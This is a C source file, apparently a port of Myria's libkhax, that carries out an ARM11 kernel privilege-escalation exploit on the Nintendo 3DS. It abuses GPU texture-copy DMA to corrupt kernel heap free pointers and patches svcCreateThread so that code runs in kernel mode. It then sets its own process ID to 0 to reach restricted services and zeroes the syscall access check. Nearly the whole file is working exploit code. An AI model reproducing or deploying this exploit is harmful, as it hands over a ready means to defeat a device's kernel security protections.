/*
 * Myria's libkhax implementation in C
 */
#include "mkhax.h"

#include "svc.h"
#include "compat.h"
#include "ctru.h"

void rand_patt()
{
	void *src = (void *)0x18000000;
	for (int i = 0; i < 3; i++) {  // Do it 3 times to be safe
		compat.app.GSPGPU_FlushDataCache(src, 0x00038400);
		compat.app.GX_SetTextureCopy(src, (void *)0x1F48F000, 0x00038400, 0, 0, 0, 0, 8);
		compat.app.svcSleepThread(0x400000LL);
		compat.app.GSPGPU_FlushDataCache(src, 0x00038400);
		compat.app.GX_SetTextureCopy(src, (void *)0x1F4C7800, 0x00038400, 0, 0, 0, 0, 8);
		compat.app.svcSleepThread(0x400000LL);
	}
}

void do_gshax_copy(void *dst, const void *src, unsigned int len)
{
	unsigned int i = 5;

	do
	{
		compat.app.memcpy(0x18401000, 0x18401000, 0x10000);
		compat.app.GSPGPU_FlushDataCache(src, len);
		// src always 0x18402000
		compat.app.GX_SetTextureCopy(src, dst, len, 0, 0, 0, 0, 8);
		compat.app.GSPGPU_FlushDataCache(0x18401000, 16);
		compat.app.GX_SetTextureCopy(dst, 0x18401000, 0x40, 0, 0, 0, 0, 8);
		compat.app.memcpy(0x18401000, 0x18401000, 0x10000);
	}while(--i > 0);
}

// after running setup, run this to execute func in ARM11 kernel mode
__attribute__((naked))
int arm11_kernel_exploit_exec(int (*func)(void))
{
	asm volatile
	(
		"svc #8\t\n" // CreateThread syscall, corrupted, args not needed
		"bx lr\t\n"
	);
}

// heap fixing thanks to Myria
void arm11_kernel_exploit_setup(void)
{
	unsigned int patch_addr;
	unsigned int *arm11_buffer = (unsigned int*) 0x18402000;
	int i;
	int (*nop_func)(void);
	int *ipc_buf;
	int model;
	patch_addr = compat.create_thread_patch;

	// Part 1: corrupt kernel memory
	void* mem_hax_mem;
	compat.app.svcControlMemory(&mem_hax_mem, 0, 0, 0x6000, 0x10003, 1 | 2);

	void* tmp_addr;
	compat.app.svcControlMemory(&tmp_addr, mem_hax_mem + 0x4000, 0, 0x1000, 1, 0); // free page
	compat.app.svcControlMemory(&tmp_addr, mem_hax_mem + 0x1000, 0, 0x2000, 1, 0); // free page

	unsigned int saved_heap_3[8];
	do_gshax_copy(arm11_buffer, mem_hax_mem + 0x1000, 0x20u);
	compat.app.memcpy(saved_heap_3, arm11_buffer, sizeof(saved_heap_3));

	unsigned int saved_heap_2[8];
	do_gshax_copy(arm11_buffer, mem_hax_mem + 0x4000, 0x20u);
	compat.app.memcpy(saved_heap_2, arm11_buffer, sizeof(saved_heap_2));

	compat.app.svcControlMemory(&tmp_addr, mem_hax_mem + 0x1000, 0, 0x2000, 0x10003, 1 | 2);
	compat.app.svcControlMemory(&tmp_addr, mem_hax_mem + 0x2000, 0, 0x1000, 1, 0); // free page

	do_gshax_copy(arm11_buffer, mem_hax_mem + 0x2000, 0x20u);

	unsigned int saved_heap[8];
	compat.app.memcpy(saved_heap, arm11_buffer, sizeof(saved_heap));

	arm11_buffer[0] = 1;
	arm11_buffer[1] = patch_addr;
	arm11_buffer[2] = 0;
	arm11_buffer[3] = 0;

	// Overwrite free pointer
	do_gshax_copy(mem_hax_mem + 0x2000, arm11_buffer, 0x10u);

	// Trigger write to kernel
	compat.app.svcControlMemory(&tmp_addr, mem_hax_mem + 0x1000, 0, 0x1000, 1, 0);

	compat.app.memcpy(arm11_buffer, saved_heap_3, sizeof(saved_heap_3));
	do_gshax_copy(mem_hax_mem + 0x1000, arm11_buffer, 0x20u);
	compat.app.memcpy(arm11_buffer, saved_heap_2, sizeof(saved_heap_2));
	do_gshax_copy(mem_hax_mem + 0x4000, arm11_buffer, 0x20u);

	rand_patt();
}

void inline invalidate_icache(void)
{
	asm
	(
		"mcr p15, 0, %0, c7, c5, 0\t\n"
		"mcr p15, 0, %0, c7, c5, 4\t\n"
		"mcr p15, 0, %0, c7, c5, 6\t\n"
		"mcr p15, 0, %0, c7, c10, 4\t\n"
		::"r" (0)
	);
}

void inline invalidate_dcache(void)
{
	asm
	(
		"mcr p15, 0, %0, c7, c14, 0\t\n"
		"mcr p15, 0, %0, c7, c10, 4\t\n"
		::"r"(0)
	);
}

__attribute__((naked)) __attribute__((noinline))
s32 patch_kernel(void)
{
	asm volatile
	(
		"add sp, sp, #8\t\n" // add	sp, sp, #0xC <- had been patched out in kernel + a single pop
		"stmfd sp!,{r0-r12,lr}\t\n"
	);

	if(compat.firmver < 0x022C0600) // Less than ver 8.0.0
	{
		struct KProcess4 *me = *((struct KProcess4**)0xFFFF9004);
		me->pid = 0;
	}
	else
	{
		struct KProcess8 *me = *((struct KProcess8**)0xFFFF9004);
		me->pid = 0;
	}

	invalidate_icache();
	invalidate_dcache();

	asm volatile
	(
		"ldmfd sp!,{r0-r12,lr}\t\n"
		"movs r0, #0\t\n"
		"ldr pc, [sp], #4 \t\n"
	);
}

__attribute__((naked)) __attribute__((noinline))
s32 unpatch_pid(void)
{
	asm volatile
	(
		"add sp, sp, #8\t\n"
		"stmfd sp!,{r0-r12,lr}\t\n"
	);

	// Fix up memory, unaligned so we have to copy by byte
	u8* create_thread_patch = (u8*)(compat.create_thread_patch + 8);
	create_thread_patch[0] = 0xE5;
	create_thread_patch[1] = 0x0C;
	create_thread_patch[2] = 0xD0;
	create_thread_patch[3] = 0x8D;

	// Allow all SVCs
	*(u32 *)(compat.svc_patch) = 0;

	register u32 target_pid asm("r12");
	if(compat.firmver < 0x022C0600) // Less than ver 8.0.0
	{
		struct KProcess4 *me = *((struct KProcess4**)0xFFFF9004);
		me->pid = target_pid;
	}
	else
	{
		struct KProcess8 *me = *((struct KProcess8**)0xFFFF9004);
		me->pid = target_pid;
	}

	invalidate_icache();
	invalidate_dcache();

	asm volatile
	(
		"ldmfd sp!,{r0-r12,lr}\t\n"
		"movs r0, #0\t\n"
		"ldr pc, [sp], #4 \t\n"
	);
}

int reinit_srv()
{
	Handle *srvHandle = (Handle *)compat.app.srv_handle;
	Result ret;

	if((ret = svcCloseHandle(*srvHandle)) != 0)
		return ret;

	if((ret = svcConnectToPort(srvHandle, "srv:")) != 0)
		return ret;

	u32 *cmdbuf = getThreadCommandBuffer();
	cmdbuf[0] = 0x10002;
	cmdbuf[1] = 0x20;

	if((ret = svcSendSyncRequest(*srvHandle)) != 0)
		return ret;

	return cmdbuf[1];
}

void patch_srv_access()
{
	u32 old_pid;
	if(svcGetProcessId(&old_pid, 0xFFFF8001) != 0)
	{
		svcExitThread();
	}

	// Set pid to 0
	arm11_kernel_exploit_exec(patch_kernel);

	// Reinit srv
	if(reinit_srv() != 0)
	{
		svcExitThread();
	}

	// Restore old pid and fix svcCreateThread
	asm volatile
	(
		"mov r12, %[target_pid]\t\n"
		::[target_pid] "r" (old_pid)
	);
	arm11_kernel_exploit_exec(unpatch_pid);
}
